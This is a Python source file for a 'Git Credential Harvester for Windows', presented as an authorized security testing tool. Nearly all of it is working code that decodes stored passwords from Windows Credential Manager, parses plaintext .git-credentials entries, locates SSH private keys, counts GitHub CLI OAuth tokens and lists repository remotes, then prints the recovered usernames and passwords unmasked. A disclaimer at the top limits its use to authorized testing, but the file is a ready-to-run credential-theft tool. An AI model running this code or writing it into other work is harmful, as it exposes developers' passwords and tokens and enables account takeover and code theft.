"""
Git Credential Harvester for Windows
Authorized Security Testing Tool

WARNING: This tool is for authorized security testing and educational purposes only.
Unauthorized use of this tool to access systems or credentials you don't own is illegal.
Use only on systems you own or have explicit written permission to test.
"""

import os
import re
import subprocess
from pathlib import Path
from typing import Dict, List, Optional
from colorama import init, Fore, Style

# Windows-specific imports
try:
    import win32cred
    import win32con
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

init(autoreset=True)


class GitCredentialHarvester:
    """Harvests Git credentials from common Windows storage locations."""
    
    def __init__(self):
        self.results = {
            'git_config': [],
            'credential_manager': [],
            'credential_helper': [],
            'ssh_keys': [],
            'github_cli': [],
            'git_credentials_file': []
        }
    
    def print_header(self):
        """Print tool header."""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Git Credential Harvester - Windows")
        print(f"{Fore.YELLOW}Authorized Security Testing Only")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    
    def check_git_config_credentials(self) -> List[Dict]:
        """Check Git config files for stored credentials."""
        credentials = []
        config_locations = [
            Path.home() / '.gitconfig',
            Path.home() / '.config' / 'git' / 'config',
            Path(os.environ.get('USERPROFILE', '')) / '.gitconfig'
        ]
        
        for config_path in config_locations:
            if config_path.exists():
                try:
                    with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        
                        url_pattern = r'url\s*=\s*(https?://[^\s]+)'
                        user_pattern = r'user\.name\s*=\s*([^\s]+)'
                        email_pattern = r'user\.email\s*=\s*([^\s]+)'
                        
                        urls = re.findall(url_pattern, content)
                        users = re.findall(user_pattern, content)
                        emails = re.findall(email_pattern, content)
                        
                        if urls or users or emails:
                            credentials.append({
                                'file': str(config_path),
                                'urls': urls,
                                'usernames': users,
                                'emails': emails,
                                'raw_content': content[:500]
                            })
                except Exception as e:
                    print(f"{Fore.RED}[!] Error reading {config_path}: {e}")
        
        return credentials
    
    def decrypt_credential_manager_entry(self, target: str) -> Optional[Dict]:
        """Decrypt a specific credential from Windows Credential Manager."""
        if not WIN32_AVAILABLE:
            return None
        
        try:
            # Try to read the credential
            cred = win32cred.CredRead(
                target,
                win32cred.CRED_TYPE_GENERIC,
                0
            )
            
            # Decode the credential blob (password)
            password = cred['CredentialBlob'].decode('utf-16le') if cred['CredentialBlob'] else None
            username = cred['UserName'] if cred['UserName'] else None
            
            return {
                'target': target,
                'username': username,
                'password': password,
                'type': cred['Type'],
                'persist': cred['Persist']
            }
        except Exception as e:
            # Credential might not exist or access denied
            return None
    
    def check_credential_manager(self) -> List[Dict]:
        """Check Windows Credential Manager for Git credentials and decrypt them."""
        credentials = []
        
        if not WIN32_AVAILABLE:
            print(f"{Fore.YELLOW}[!] pywin32 not available. Cannot decrypt credentials.")
            print(f"{Fore.YELLOW}[!] Install with: pip install pywin32")
            # Fallback to cmdkey listing
            try:
                result = subprocess.run(
                    ['cmdkey', '/list'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                
                if 'git' in result.stdout.lower() or 'github' in result.stdout.lower():
                    git_entries = []
                    for line in result.stdout.split('\n'):
                        if 'git' in line.lower() or 'github' in line.lower():
                            git_entries.append(line.strip())
                    
                    if git_entries:
                        credentials.append({
                            'source': 'Windows Credential Manager',
                            'entries': git_entries,
                            'raw_output': result.stdout,
                            'decrypted': False
                        })
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Could not access Credential Manager: {e}")
            return credentials
        
        try:
            # List all credentials
            result = subprocess.run(
                ['cmdkey', '/list'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            raw_output = result.stdout
            git_targets = []
            
            # Parse cmdkey output to find Git-related credentials
            for line in result.stdout.split('\n'):
                if 'Target:' in line:
                    target = line.split('Target:', 1)[1].strip()
                    if 'git' in target.lower() or 'github' in target.lower():
                        git_targets.append(target)
            
            # Also try common Git credential targets directly
            common_targets = [
                'git:https://github.com',
                'LegacyGeneric:target=git:https://github.com',
                'git:https://gitlab.com',
                'LegacyGeneric:target=git:https://gitlab.com',
            ]
            
            for target in common_targets:
                if target not in git_targets:
                    git_targets.append(target)
            
            # Try to decrypt each Git-related credential
            decrypted_creds = []
            for target in git_targets:
                decrypted = self.decrypt_credential_manager_entry(target)
                if decrypted:
                    decrypted_creds.append(decrypted)
            
            # Also enumerate all credentials and check for Git-related ones
            try:
                flags = 0
                filter_str = None
                creds = win32cred.CredEnumerate(filter_str, flags)
                
                for cred in creds:
                    target = cred['TargetName']
                    if 'git' in target.lower() or 'github' in target.lower():
                        # Decrypt this credential
                        decrypted = self.decrypt_credential_manager_entry(target)
                        if decrypted and decrypted not in decrypted_creds:
                            decrypted_creds.append(decrypted)
            except Exception as e:
                # Enumeration might fail, that's okay
                pass
            
            if decrypted_creds or git_targets:
                credentials.append({
                    'source': 'Windows Credential Manager',
                    'entries': git_targets,
                    'decrypted_credentials': decrypted_creds,
                    'raw_output': raw_output,
                    'decrypted': len(decrypted_creds) > 0
                })
                
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Could not access Credential Manager: {e}")
        
        return credentials
    
    def check_credential_helper(self) -> List[Dict]:
        """Check Git credential helper configuration."""
        credentials = []
        
        # Check if git is available first
        try:
            subprocess.run(
                ['git', '--version'],
                capture_output=True,
                timeout=2
            )
        except (FileNotFoundError, subprocess.TimeoutExpired):
            # Git not installed or not in PATH - silently skip
            return credentials
        
        try:
            result = subprocess.run(
                ['git', 'config', '--global', '--get-regexp', 'credential'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0 and result.stdout:
                helper_config = {}
                for line in result.stdout.strip().split('\n'):
                    if '=' in line:
                        key, value = line.split('=', 1)
                        helper_config[key.strip()] = value.strip()
                
                if helper_config:
                    credentials.append({
                        'source': 'Git Credential Helper',
                        'config': helper_config,
                        'raw_output': result.stdout
                    })
        except Exception:
            # Silently skip if git config fails
            pass
        
        return credentials
    
    def check_git_credentials_file(self) -> List[Dict]:
        """Check .git-credentials file."""
        credentials = []
        cred_file = Path.home() / '.git-credentials'
        
        if cred_file.exists():
            try:
                with open(cred_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read().strip()
                    lines = [line for line in content.split('\n') if line]
                    
                    parsed_creds = []
                    for line in lines:
                        if '://' in line:
                            parsed_creds.append(line)
                    
                    if parsed_creds:
                        credentials.append({
                            'file': str(cred_file),
                            'credentials': parsed_creds,
                            'count': len(parsed_creds)
                        })
            except Exception as e:
                print(f"{Fore.RED}[!] Error reading credentials file: {e}")
        
        return credentials
    
    def check_ssh_keys(self) -> List[Dict]:
        """Check for SSH keys that might be used with Git."""
        ssh_keys = []
        ssh_dir = Path.home() / '.ssh'
        
        if ssh_dir.exists():
            key_files = list(ssh_dir.glob('id_*'))
            pub_keys = list(ssh_dir.glob('*.pub'))
            
            if key_files or pub_keys:
                keys_info = []
                for key_file in key_files + pub_keys:
                    try:
                        stat = key_file.stat()
                        keys_info.append({
                            'file': key_file.name,
                            'path': str(key_file),
                            'size': stat.st_size,
                            'modified': stat.st_mtime
                        })
                    except:
                        pass
                
                if keys_info:
                    ssh_keys.append({
                        'directory': str(ssh_dir),
                        'keys': keys_info
                    })
        
        return ssh_keys
    
    def check_github_cli(self) -> List[Dict]:
        """Check GitHub CLI for stored tokens."""
        github_cli_data = []
        
        github_cli_paths = [
            Path.home() / '.config' / 'gh' / 'hosts.yml',
            Path(os.environ.get('APPDATA', '')) / 'GitHub CLI' / 'hosts.yml'
        ]
        
        for cli_path in github_cli_paths:
            if cli_path.exists():
                try:
                    with open(cli_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        
                        token_pattern = r'oauth_token:\s*([^\s]+)'
                        tokens = re.findall(token_pattern, content)
                        
                        if tokens or 'github.com' in content.lower():
                            github_cli_data.append({
                                'file': str(cli_path),
                                'tokens_found': len(tokens),
                                'has_github_config': 'github.com' in content.lower(),
                                'content_preview': content[:500]
                            })
                except Exception as e:
                    print(f"{Fore.YELLOW}[!] Error reading GitHub CLI config: {e}")
        
        return github_cli_data
    
    def check_git_repos(self) -> List[Dict]:
        """Check for Git repositories and their remote URLs."""
        repos = []
        common_locations = [
            Path.home() / 'Documents',
            Path.home() / 'Desktop',
            Path.home() / 'Projects',
            Path(os.environ.get('USERPROFILE', '')) / 'source' / 'repos'
        ]
        
        for location in common_locations:
            if location.exists():
                for git_dir in location.rglob('.git'):
                    if git_dir.is_dir():
                        config_file = git_dir / 'config'
                        if config_file.exists():
                            try:
                                with open(config_file, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    url_pattern = r'url\s*=\s*(https?://[^\s]+)'
                                    urls = re.findall(url_pattern, content)
                                    
                                    if urls:
                                        repos.append({
                                            'path': str(git_dir.parent),
                                            'remote_urls': urls
                                        })
                            except:
                                pass
        
        return repos
    
    def harvest(self):
        """Run all credential harvesting checks."""
        print(f"{Fore.GREEN}[*] Starting credential harvest...\n")
        
        print(f"{Fore.CYAN}[*] Checking Git config files...")
        self.results['git_config'] = self.check_git_config_credentials()
        
        print(f"{Fore.CYAN}[*] Checking Windows Credential Manager...")
        self.results['credential_manager'] = self.check_credential_manager()
        
        print(f"{Fore.CYAN}[*] Checking Git credential helper...")
        self.results['credential_helper'] = self.check_credential_helper()
        
        print(f"{Fore.CYAN}[*] Checking .git-credentials file...")
        self.results['git_credentials_file'] = self.check_git_credentials_file()
        
        print(f"{Fore.CYAN}[*] Checking SSH keys...")
        self.results['ssh_keys'] = self.check_ssh_keys()
        
        print(f"{Fore.CYAN}[*] Checking GitHub CLI...")
        self.results['github_cli'] = self.check_github_cli()
        
        print(f"{Fore.CYAN}[*] Scanning for Git repositories...")
        self.results['git_repos'] = self.check_git_repos()
        
        print(f"\n{Fore.GREEN}[+] Harvest complete!\n")
    
    def print_results(self):
        """Print harvested credentials in a formatted way."""
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}HARVEST RESULTS")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        total_findings = 0
        
        if self.results['git_config']:
            print(f"{Fore.YELLOW}[!] Git Config Files Found:")
            for config in self.results['git_config']:
                print(f"  {Fore.WHITE}File: {config['file']}")
                if config['urls']:
                    print(f"  {Fore.RED}URLs: {', '.join(config['urls'])}")
                if config['usernames']:
                    print(f"  {Fore.RED}Usernames: {', '.join(config['usernames'])}")
                if config['emails']:
                    print(f"  {Fore.RED}Emails: {', '.join(config['emails'])}")
                print()
                total_findings += 1
        
        if self.results['credential_manager']:
            print(f"{Fore.YELLOW}[!] Windows Credential Manager Entries:")
            for entry in self.results['credential_manager']:
                if entry.get('decrypted_credentials'):
                    print(f"  {Fore.GREEN}[+] DECRYPTED CREDENTIALS:")
                    for cred in entry['decrypted_credentials']:
                        if cred.get('username'):
                            print(f"    {Fore.GREEN}Username: {Fore.RED}{cred['username']}")
                        if cred.get('password'):
                            print(f"    {Fore.GREEN}Password: {Fore.RED}{cred['password']}")
                else:
                    for line in entry['entries']:
                        print(f"  {Fore.RED}{line}")
                    if not entry.get('decrypted'):
                        print(f"  {Fore.YELLOW}[!] Could not decrypt (install pywin32: pip install pywin32)")
                total_findings += 1
        
        if self.results['credential_helper']:
            print(f"{Fore.YELLOW}[!] Git Credential Helper Config:")
            for helper in self.results['credential_helper']:
                print(f"  {Fore.WHITE}Source: {helper['source']}")
                for key, value in helper['config'].items():
                    print(f"  {Fore.RED}{key} = {value}")
                print()
                total_findings += 1
        
        if self.results['git_credentials_file']:
            print(f"{Fore.YELLOW}[!] .git-credentials File Found:")
            for cred_file in self.results['git_credentials_file']:
                print(f"  {Fore.WHITE}File: {cred_file['file']}")
                print(f"  {Fore.RED}Credentials: {cred_file['count']} found")
                for cred in cred_file['credentials'][:3]:
                    masked = self.mask_credentials(cred)
                    print(f"    {Fore.RED}{masked}")
                if cred_file['count'] > 3:
                    print(f"    {Fore.YELLOW}... and {cred_file['count'] - 3} more")
                print()
                total_findings += 1
        
        if self.results['ssh_keys']:
            print(f"{Fore.YELLOW}[!] SSH Keys Found:")
            for ssh_data in self.results['ssh_keys']:
                print(f"  {Fore.WHITE}Directory: {ssh_data['directory']}")
                for key in ssh_data['keys']:
                    print(f"  {Fore.RED}Key: {key['file']} ({key['size']} bytes)")
                print()
                total_findings += 1
        
        if self.results['github_cli']:
            print(f"{Fore.YELLOW}[!] GitHub CLI Config Found:")
            for cli_data in self.results['github_cli']:
                print(f"  {Fore.WHITE}File: {cli_data['file']}")
                if cli_data['tokens_found'] > 0:
                    print(f"  {Fore.RED}Tokens Found: {cli_data['tokens_found']}")
                print()
                total_findings += 1
        
        if self.results['git_repos']:
            print(f"{Fore.YELLOW}[!] Git Repositories Found: {len(self.results['git_repos'])}")
            for repo in self.results['git_repos'][:10]:
                print(f"  {Fore.WHITE}Repo: {repo['path']}")
                for url in repo['remote_urls']:
                    print(f"  {Fore.RED}Remote: {url}")
            if len(self.results['git_repos']) > 10:
                print(f"  {Fore.YELLOW}... and {len(self.results['git_repos']) - 10} more repositories")
            print()
            total_findings += len(self.results['git_repos'])
        
        if total_findings == 0:
            print(f"{Fore.GREEN}[+] No credentials found in common locations.\n")
        else:
            print(f"{Fore.YELLOW}[!] Total findings: {total_findings}\n")
    
    def mask_credentials(self, credential_string: str) -> str:
        """Mask sensitive parts of credentials for display."""
        if '://' in credential_string:
            parts = credential_string.split('://')
            if len(parts) == 2:
                protocol = parts[0]
                rest = parts[1]
                if '@' in rest:
                    user_pass, host = rest.split('@', 1)
                    if ':' in user_pass:
                        user, password = user_pass.split(':', 1)
                        masked = f"{protocol}://{user}:{'*' * min(len(password), 8)}@{host}"
                    else:
                        masked = f"{protocol}://{user_pass}@{host}"
                else:
                    masked = credential_string
            else:
                masked = credential_string
        else:
            masked = credential_string
        
        return masked
    
    def detect_encoding(self, file_path: str) -> str:
        """Detect file encoding."""
        try:
            import chardet
            with open(file_path, 'rb') as f:
                raw_data = f.read()
                result = chardet.detect(raw_data)
                return result.get('encoding', 'unknown')
        except:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    f.read()
                return 'utf-8'
            except:
                try:
                    with open(file_path, 'r', encoding='latin-1') as f:
                        f.read()
                    return 'latin-1'
                except:
                    return 'unknown'
    
    def check_encryption(self, content: str) -> Dict:
        """Check if content appears encrypted or encoded."""
        encryption_info = {
            'is_base64': False,
            'is_hex': False,
            'is_encrypted': False,
            'has_encryption_indicators': []
        }
        
        try:
            import base64
            if len(content) > 20:
                try:
                    base64.b64decode(content)
                    encryption_info['is_base64'] = True
                    encryption_info['has_encryption_indicators'].append('Base64 encoded')
                except:
                    pass
        except:
            pass
        
        if re.match(r'^[0-9a-fA-F\s]+$', content) and len(content) > 20:
            encryption_info['is_hex'] = True
            encryption_info['has_encryption_indicators'].append('Hex encoded')
        
        encryption_keywords = ['encrypted', 'cipher', 'aes', 'rsa', 'pgp', 'gpg', 'salt', 'iv']
        content_lower = content.lower()
        for keyword in encryption_keywords:
            if keyword in content_lower:
                encryption_info['is_encrypted'] = True
                encryption_info['has_encryption_indicators'].append(f'Contains {keyword}')
        
        return encryption_info
    
    def extract_credentials_from_string(self, cred_string: str) -> Dict:
        """Extract username and password from credential string."""
        cred_info = {
            'username': None,
            'password': None,
            'protocol': None,
            'host': None,
            'full_url': None
        }
        
        if '://' in cred_string:
            parts = cred_string.split('://')
            cred_info['protocol'] = parts[0]
            rest = parts[1] if len(parts) > 1 else ''
            
            if '@' in rest:
                auth_part, host_part = rest.split('@', 1)
                cred_info['host'] = host_part.split('/')[0] if '/' in host_part else host_part
                
                if ':' in auth_part:
                    cred_info['username'] = auth_part.split(':')[0]
                    cred_info['password'] = ':'.join(auth_part.split(':')[1:])
                else:
                    cred_info['username'] = auth_part
                
                cred_info['full_url'] = cred_string
        
        return cred_info
    
    def print_detailed_results(self):
        """Print detailed results to terminal with all information."""
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}RESULTS")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        total_findings = 0
        
        if self.results['git_config']:
            print(f"\n{Fore.YELLOW}[!] GIT CONFIG FILES")
            print(f"{Fore.YELLOW}{'-'*70}{Style.RESET_ALL}")
            for config in self.results['git_config']:
                print(f"  File: {Fore.CYAN}{config['file']}")
                total_findings += 1
                
                try:
                    file_stat = os.stat(config['file'])
                    print(f"  {Fore.WHITE}File Size: {Fore.GREEN}{file_stat.st_size} bytes")
                    print(f"  {Fore.WHITE}Modified: {Fore.GREEN}{file_stat.st_mtime}")
                except:
                    pass
                
                encoding = self.detect_encoding(config['file'])
                print(f"  {Fore.WHITE}Encoding: {Fore.GREEN}{encoding}")
                
                if config['urls']:
                    print(f"  {Fore.RED}URLs:")
                    for url in config['urls']:
                        print(f"    {Fore.RED}{url}")
                        cred_info = self.extract_credentials_from_string(url)
                        if cred_info['username']:
                            print(f"      Username: {Fore.RED}{cred_info['username']}")
                        if cred_info['password']:
                            print(f"      Password: {Fore.RED}{cred_info['password']}")
                
                if config['usernames']:
                    print(f"  {Fore.RED}Usernames: {', '.join(config['usernames'])}")
                
                if config['emails']:
                    print(f"  {Fore.RED}Emails: {', '.join(config['emails'])}")
                    encryption_info = self.check_encryption(config['raw_content'])
                    if encryption_info['has_encryption_indicators']:
                        print(f"  {Fore.YELLOW}Encryption/Encoding Indicators:")
                        for indicator in encryption_info['has_encryption_indicators']:
                            print(f"    {Fore.YELLOW}  - {indicator}")
        
        if self.results['credential_manager']:
            print(f"\n{Fore.YELLOW}[!] WINDOWS CREDENTIAL MANAGER")
            print(f"{Fore.YELLOW}{'-'*70}{Style.RESET_ALL}")
            for entry in self.results['credential_manager']:
                print(f"  Source: {Fore.CYAN}{entry['source']}")
                print(f"  Encryption: {Fore.GREEN}Windows DPAPI")
                if entry.get('decrypted_credentials'):
                    print(f"  {Fore.GREEN}[+] DECRYPTED CREDENTIALS:")
                    # Deduplicate credentials by username+password combination
                    seen = set()
                    for cred in entry['decrypted_credentials']:
                        cred_key = (cred.get('username', ''), cred.get('password', ''))
                        if cred_key not in seen and cred_key != ('', ''):
                            seen.add(cred_key)
                            if cred.get('username'):
                                print(f"    Username: {Fore.RED}{cred['username']}")
                            if cred.get('password'):
                                print(f"    Password: {Fore.RED}{cred['password']}")
                else:
                    print(f"  {Fore.YELLOW}Entries (not decrypted):")
                    for line in entry['entries']:
                        print(f"    {Fore.YELLOW}{line}")
                    if not entry.get('decrypted'):
                        print(f"  {Fore.YELLOW}[!] Install: pip install pywin32")
            total_findings += len(self.results['credential_manager'])
        
        if self.results['credential_helper']:
            print(f"\n{Fore.YELLOW}[!] GIT CREDENTIAL HELPER")
            print(f"{Fore.YELLOW}{'-'*70}{Style.RESET_ALL}")
            for helper in self.results['credential_helper']:
                print(f"\n  {Fore.WHITE}Source: {Fore.CYAN}{helper['source']}")
                print(f"  {Fore.WHITE}Storage Method: {Fore.GREEN}Git Credential Helper")
                print(f"\n  {Fore.RED}Configuration:")
                for key, value in helper['config'].items():
                    print(f"    {Fore.RED}  {key} = {value}")
                    if 'manager' in value.lower() or 'wincred' in value.lower():
                        print(f"      {Fore.YELLOW}  -> Uses Windows Credential Manager (DPAPI encrypted)")
                    elif 'store' in value.lower():
                        print(f"      {Fore.YELLOW}  -> Uses plaintext storage")
                    elif 'cache' in value.lower():
                        print(f"      {Fore.YELLOW}  -> Uses in-memory cache (temporary)")
                if helper.get('raw_output'):
                    print(f"\n  {Fore.WHITE}Raw Output:")
                    print(f"  {Fore.CYAN}{helper['raw_output']}")
        
        if self.results['git_credentials_file']:
            print(f"\n{Fore.YELLOW}[!] .GIT-CREDENTIALS FILE")
            print(f"{Fore.YELLOW}{'-'*70}{Style.RESET_ALL}")
            for cred_file in self.results['git_credentials_file']:
                print(f"\n  {Fore.WHITE}File Location: {Fore.CYAN}{cred_file['file']}")
                
                try:
                    file_stat = os.stat(cred_file['file'])
                    print(f"  {Fore.WHITE}File Size: {Fore.GREEN}{file_stat.st_size} bytes")
                    print(f"  {Fore.WHITE}Modified: {Fore.GREEN}{file_stat.st_mtime}")
                except:
                    pass
                
                encoding = self.detect_encoding(cred_file['file'])
                print(f"  {Fore.WHITE}Encoding: {Fore.GREEN}{encoding}")
                print(f"  {Fore.WHITE}Storage Type: {Fore.RED}PLAINTEXT (UNENCRYPTED)")
                print(f"  {Fore.WHITE}Security: {Fore.RED}CRITICAL - Credentials stored in plaintext")
                
                print(f"\n  {Fore.RED}Credentials Found ({cred_file['count']}):")
                for i, cred in enumerate(cred_file['credentials'], 1):
                    print(f"\n    {Fore.YELLOW}Credential #{i}:")
                    cred_info = self.extract_credentials_from_string(cred)
                    if cred_info['protocol']:
                        print(f"      {Fore.WHITE}Protocol: {Fore.GREEN}{cred_info['protocol']}")
                    if cred_info['host']:
                        print(f"      {Fore.WHITE}Host: {Fore.GREEN}{cred_info['host']}")
                    if cred_info['username']:
                        print(f"      {Fore.WHITE}Username: {Fore.RED}{cred_info['username']}")
                    if cred_info['password']:
                        print(f"      {Fore.WHITE}Password: {Fore.RED}{cred_info['password']}")
                    print(f"      {Fore.WHITE}Full URL: {Fore.CYAN}{cred}")
                    
                    encryption_info = self.check_encryption(cred_info['password'] if cred_info['password'] else '')
                    if encryption_info['has_encryption_indicators']:
                        print(f"      {Fore.YELLOW}Password Encoding:")
                        for indicator in encryption_info['has_encryption_indicators']:
                            print(f"        {Fore.YELLOW}  - {indicator}")
        
        if self.results['ssh_keys']:
            print(f"\n{Fore.YELLOW}[!] SSH KEYS")
            print(f"{Fore.YELLOW}{'-'*70}{Style.RESET_ALL}")
            for ssh_data in self.results['ssh_keys']:
                print(f"\n  {Fore.WHITE}Directory: {Fore.CYAN}{ssh_data['directory']}")
                print(f"  {Fore.WHITE}Storage Type: {Fore.GREEN}SSH Key Files")
                print(f"  {Fore.WHITE}Encryption: {Fore.GREEN}SSH keys are typically encrypted with passphrase")
                print(f"\n  {Fore.RED}Keys Found:")
                for key in ssh_data['keys']:
                    print(f"\n    {Fore.RED}Key File: {key['file']}")
                    print(f"      {Fore.WHITE}Full Path: {Fore.CYAN}{key['path']}")
                    print(f"      {Fore.WHITE}Size: {Fore.GREEN}{key['size']} bytes")
                    print(f"      {Fore.WHITE}Modified: {Fore.GREEN}{key['modified']}")
                    if key['file'].endswith('.pub'):
                        print(f"      {Fore.YELLOW}Type: Public Key (safe to share)")
                    else:
                        print(f"      {Fore.RED}Type: Private Key (KEEP SECRET)")
        
        if self.results['github_cli']:
            print(f"\n{Fore.YELLOW}[!] GITHUB CLI CONFIGURATION")
            print(f"{Fore.YELLOW}{'-'*70}{Style.RESET_ALL}")
            for cli_data in self.results['github_cli']:
                print(f"\n  {Fore.WHITE}File Location: {Fore.CYAN}{cli_data['file']}")
                
                try:
                    file_stat = os.stat(cli_data['file'])
                    print(f"  {Fore.WHITE}File Size: {Fore.GREEN}{file_stat.st_size} bytes")
                except:
                    pass
                
                encoding = self.detect_encoding(cli_data['file'])
                print(f"  {Fore.WHITE}Encoding: {Fore.GREEN}{encoding}")
                print(f"  {Fore.WHITE}Storage Type: {Fore.GREEN}YAML Configuration")
                
                if cli_data['tokens_found'] > 0:
                    print(f"  {Fore.RED}OAuth Tokens Found: {cli_data['tokens_found']}")
                    print(f"  {Fore.WHITE}Token Storage: {Fore.YELLOW}Stored in plaintext YAML")
                if cli_data['has_github_config']:
                    print(f"  {Fore.GREEN}GitHub configuration detected")
                
                if cli_data.get('content_preview'):
                    print(f"\n  {Fore.WHITE}Content Preview:")
                    print(f"  {Fore.CYAN}{cli_data['content_preview']}")
        
        if self.results['git_repos']:
            print(f"\n{Fore.YELLOW}[!] GIT REPOSITORIES")
            print(f"{Fore.YELLOW}{'-'*70}{Style.RESET_ALL}")
            print(f"  Total: {Fore.GREEN}{len(self.results['git_repos'])}")
            for repo in self.results['git_repos']:
                print(f"  Path: {Fore.CYAN}{repo['path']}")
                for url in repo['remote_urls']:
                    print(f"    Remote: {Fore.RED}{url}")
            total_findings += len(self.results['git_repos'])
        
        if self.results['credential_helper']:
            total_findings += len(self.results['credential_helper'])
        if self.results['git_credentials_file']:
            total_findings += len(self.results['git_credentials_file'])
        if self.results['ssh_keys']:
            total_findings += len(self.results['ssh_keys'])
        if self.results['github_cli']:
            total_findings += len(self.results['github_cli'])
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        if total_findings > 0:
            print(f"{Fore.YELLOW}[!] Total findings: {total_findings}")
        else:
            print(f"{Fore.GREEN}[+] No credentials found in common locations.")


def main():
    """Main function."""
    harvester = GitCredentialHarvester()
    harvester.print_header()
    
    print(f"{Fore.YELLOW}WARNING: This tool is for authorized security testing only.")
    print(f"{Fore.YELLOW}Unauthorized use may be illegal. Use at your own risk.\n")
    
    harvester.harvest()
    harvester.print_detailed_results()
    
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}Scan complete.")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")


if __name__ == '__main__':
    main()

